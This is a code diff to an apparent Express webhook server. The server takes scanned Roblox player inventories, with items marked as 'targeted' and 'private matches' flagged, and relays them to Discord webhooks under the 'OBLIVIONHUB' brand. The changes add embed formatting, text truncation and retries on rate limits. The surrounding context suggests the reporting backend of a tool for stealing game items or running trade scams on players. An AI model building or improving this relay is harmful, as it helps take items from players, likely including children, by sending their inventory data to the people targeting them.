@@ -32,7 +32,7 @@ app.post('/webhook', async (req, res) => {
         const privateBaseTargeted = data.privateBaseTargeted || [];
         const privateGearTargeted = data.privateGearTargeted || [];
 
-        // Listas completas de todos los ítems del jugador
+        // Listas completas de todos los ítems del jugador (sin filtrar)
         const allBrainrots = data.brainrots || [];
         const allBases = data.bases || [];
         const allGears = data.gears || [];
@@ -41,7 +41,7 @@ app.post('/webhook', async (req, res) => {
 
         // Función para formatear lista con conteo de duplicados
         function formatListWithCount(list) {
-            if (!list || list.length === 0) return '`Ninguno`';
+            if (!list || list.length === 0) return 'Ninguno';
             const counts = {};
             list.forEach(item => {
                 counts[item] = (counts[item] || 0) + 1;
@@ -50,6 +50,12 @@ app.post('/webhook', async (req, res) => {
                 return counts[name] > 1 ? `${name} (x${counts[name]})` : name;
             });
             return formatted.join(', ');
+        }
+
+        // Función para truncar texto si es muy largo (máximo 1024 caracteres para campos de embed)
+        function truncateText(text, maxLength = 1024) {
+            if (text.length <= maxLength) return text;
+            return text.substring(0, maxLength - 3) + '...';
         }
 
         // Extraer nombres de todas las listas completas
@@ -70,38 +76,23 @@ app.post('/webhook', async (req, res) => {
             displayGearTargeted = gearTargeted;
         }
 
-        // Construir mensaje
-        const lines = [];
+        // Crear un Set con todos los ítems targeteados (para calcular los no targeteados)
+        const targetedSet = new Set([
+            ...displayBrainTargeted,
+            ...displayBaseTargeted,
+            ...displayGearTargeted
+        ]);
 
-        // Encabezado con emojis y negritas
-        lines.push('**✅ SUCCESS: OBLIVIONHUB INVITE SENT**');
-        lines.push(`✨ Invite successfully sent to **Username:** ${player}`);
-        lines.push('📡 Inventory scan complete. Processing items...');
-        lines.push('');
+        // Calcular ítems no targeteados (los que están en allItems pero no en targetedSet)
+        const untargetedItems = allItems.filter(item => !targetedSet.has(item));
 
-        // Secciones con emojis
-        lines.push('**🧠 Brainrots targeted:**');
-        lines.push(formatListWithCount(displayBrainTargeted));
-        lines.push('');
+        // Formatear las listas
+        const brainTargetedStr = formatListWithCount(displayBrainTargeted);
+        const gearTargetedStr = formatListWithCount(displayGearTargeted);
+        const baseTargetedStr = formatListWithCount(displayBaseTargeted);
+        const untargetedStr = formatListWithCount(untargetedItems);
 
-        lines.push('**⚙️ Gears targeted:**');
-        lines.push(formatListWithCount(displayGearTargeted));
-        lines.push('');
-
-        lines.push('**🎨 Bases targeted:**');
-        lines.push(formatListWithCount(displayBaseTargeted));
-        lines.push('');
-
-        // Sección de ítems no targeteados (antes "ALL ITEMS")
-        lines.push('**📦 UN-TARGETED ITEMS:**');
-        if (allItems.length === 0) {
-            lines.push('`Ninguno`');
-        } else {
-            lines.push(formatListWithCount(allItems));
-        }
-        lines.push('');
-
-        // Footer con solo fecha (sin hora) y enlaces
+        // Fecha sin hora (solo día-mes-año)
         const date = new Date(timestamp);
         const formattedDate = date.toLocaleDateString('es-ES', {
             timeZone: 'UTC',
@@ -109,17 +100,60 @@ app.post('/webhook', async (req, res) => {
             month: '2-digit',
             day: '2-digit'
         }).replace(/\//g, '-');
-        lines.push(`📅 ${formattedDate} UTC`);
-        lines.push('');
-        lines.push('**🔗 discord.gg/oblivionhub**');
-        lines.push('**🌐 oblivionhub.xyz**');
 
-        const fullContent = lines.join('\n');
+        // Construir el embed
+        const embed = {
+            title: '✅ OBLIVIONHUB SUCCESS',
+            color: 0x00ff00, // Verde
+            fields: [
+                {
+                    name: '👤 Username',
+                    value: player,
+                    inline: false
+                },
+                {
+                    name: '🧠 Brainrots targeted',
+                    value: brainTargetedStr,
+                    inline: false
+                },
+                {
+                    name: '⚙️ Gears targeted',
+                    value: gearTargetedStr,
+                    inline: false
+                },
+                {
+                    name: '🎨 Bases targeted',
+                    value: baseTargetedStr,
+                    inline: false
+                },
+                {
+                    name: '📦 UN-TARGETED ITEMS',
+                    value: truncateText(untargetedStr),
+                    inline: false
+                },
+                {
+                    name: '🔗 Links',
+                    value: '[discord.gg/oblivionhub](https://discord.gg/oblivionhub) | [oblivionhub.xyz](https://oblivionhub.xyz)',
+                    inline: false
+                }
+            ],
+            footer: {
+                text: `OBLIVIONHUB | Automated System • ${formattedDate} UTC`
+            }
+        };
+
+        // Si hay coincidencia privada, cambiar el color a dorado y agregar un campo extra
+        if (hasPrivateItem) {
+            embed.color = 0xffd700; // Dorado
+            embed.fields.push({
+                name: '🔴 PRIVATE MATCH',
+                value: '¡Coincidencia con ítems privados!',
+                inline: false
+            });
+        }
 
         const payload = {
-            content: fullContent,
-            username: 'TradeNotifier',
-            avatar_url: 'https://cdn.pfps.gg/pfps/10184-389218-roblox.png'
+            embeds: [embed]
         };
 
         // Decidir a qué webhooks enviar
@@ -138,13 +172,26 @@ app.post('/webhook', async (req, res) => {
             webhooksToSend.push(FALLBACK_WEBHOOK);
         }
 
-        // Enviar a todos los webhooks
+        // Enviar a todos los webhooks con reintentos para evitar rate limit (429)
         for (const url of webhooksToSend) {
-            try {
-                await axios.post(url, payload);
-                console.log(`✅ Enviado a: ${url}`);
-            } catch (err) {
-                console.error(`❌ Error enviando a ${url}:`, err.message);
+            let retries = 3;
+            let success = false;
+            while (retries > 0 && !success) {
+                try {
+                    await axios.post(url, payload);
+                    console.log(`✅ Enviado a: ${url}`);
+                    success = true;
+                } catch (err) {
+                    if (err.response && err.response.status === 429) {
+                        const retryAfter = parseInt(err.response.headers['retry-after']) || 5;
+                        console.log(`⏳ Rate limit en ${url}. Esperando ${retryAfter} segundos...`);
+                        await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
+                        retries--;
+                    } else {
+                        console.error(`❌ Error enviando a ${url}:`, err.message);
+                        retries = 0;
+                    }
+                }
             }
         }
 
